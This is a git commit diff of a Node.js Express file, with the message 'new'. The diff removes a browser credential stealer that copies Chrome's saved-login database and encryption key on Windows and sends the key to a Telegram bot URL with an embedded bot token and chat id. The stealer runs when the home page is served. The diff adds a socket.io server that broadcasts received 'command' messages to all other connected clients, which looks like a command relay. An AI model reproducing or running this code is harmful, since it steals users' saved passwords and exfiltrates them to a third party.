b78d643a513abc7d652ef8c41db3b499129e6179
DMQuan03 <123900871+DMQuan03@users.noreply.github.com>
2024-04-17 16:27:17 +0700

    new

--- src/index.js
+++ src/index.js
@@ -1,89 +1,33 @@
-const { Console } = require('console');
 const express = require('express');
 const app = express();
-const port = 3005;
-const fs = require('fs');
-const os = require('os');
-const sqlite3 = require('sqlite3').verbose();
-const aesjs = require('aes-js');
-const base64 = require('base64-js');
-const crypto = require('crypto');
-const { spawnSync } = require('child_process');
+const cors = require('cors');
+const socket = require('socket.io');
 
-const USER_INFO = os.userInfo().username;
-const LOCAL_STATE = `C:\Users\\${USER_INFO}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State`;
-const CHROME_PATH = `C:\Users\\${USER_INFO}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data`;
+require('dotenv').config();
+const PORT = 5678;
+app.use(cors());
+app.use(express.json());
 
-const generate_cipher = (cipher, payload) => {
-    return aesjs.AES;
-};
-
-const decrypt_password = (cipher_text, secret_key) => {
-    let init_vector = cipher_text.slice(3, 15);
-    let encrypt_password = cipher_text.slice(15, -16);
-    let cipher = generate_cipher();
-};
-
-fs.access('D:\\Loginvault.db', fs.constants.F_OK, (err) => {
-    if (err) {
-        fs.copyFile(CHROME_PATH, 'D:\\Loginvault.db', (err, data) => {
-            if (err) {
-                console.error('Error coppy source file:', err);
-                return;
-            }
-            console.log('success');
-        });
-        return;
-    }
-    console.log('File exists');
+const server = app.listen(PORT, () => {
+    console.log(`server is running ${PORT}`);
 });
-const db = new sqlite3.Database('D:\\Loginvault.db', (err) => {
-    if (err) {
-        console.error('Error opening database:', err);
-    } else {
-        console.log('Connected to the SQLite database.');
-    }
-});
-const get_key = async () => {
-    fs.readFile(LOCAL_STATE, 'utf8', (err, data) => {
-        if (err) {
-            console.error(err);
-            return;
-        }
-        data = JSON.parse(data);
-        const decodedString = Buffer.from(data.os_crypt.encrypted_key).toString(
-            'utf-8',
-        );
 
-        fetch(
-            `https://api.telegram.org/bot6926656520:AAHRSnlX2_xHNg1P5AXc6LXyx1455R7NeUc/sendMessage?chat_id=6290053899&text=${decodedString}}`,
-            {
-                method: 'GET',
-            },
-        );
+const io = socket(server, {
+    cors: {
+        origin: '*',
+        credentials: true,
+        methods: ['GET', 'PUT', 'PATCH', 'DELETE', 'POST'],
+    },
+});
+
+io.on('connection', (socket) => {
+    console.log('user connected');
+    socket.on('command', (data) => {
+        console.log(data);
+        socket.broadcast.emit('server_send_command', data);
     });
 
-    db.each(
-        'SELECT action_url, username_value, password_value FROM logins',
-        (err, rows) => {
-            if (err) console.log(err.message);
-            // else console.log(rows)
-        },
-    );
-
-    // Đóng kết nối sau khi hoàn tất
-    //   data = JSON.parse(data)
-    //   const decodedString = Buffer.from(data.os_crypt.encrypted_key).toString("utf-8");
-    // fetch(`https://api.telegram.org/bot6926656520:AAHRSnlX2_xHNg1P5AXc6LXyx1455R7NeUc/sendMessage?chat_id=6290053899&text=${data}}`, {
-    //     method : "GET"
-    // })
-};
-
-app.get('/', (req, res) => {
-    res.sendFile('./index.html', { root: __dirname });
-    get_key();
+    socket.on('disconnect', async () => {
+        console.log('user ip disconnected' + socket.ip);
+    });
 });
-
-app.listen(port, () =>
-    console.log(`app Listening at http://localhost:${port}`),
-);
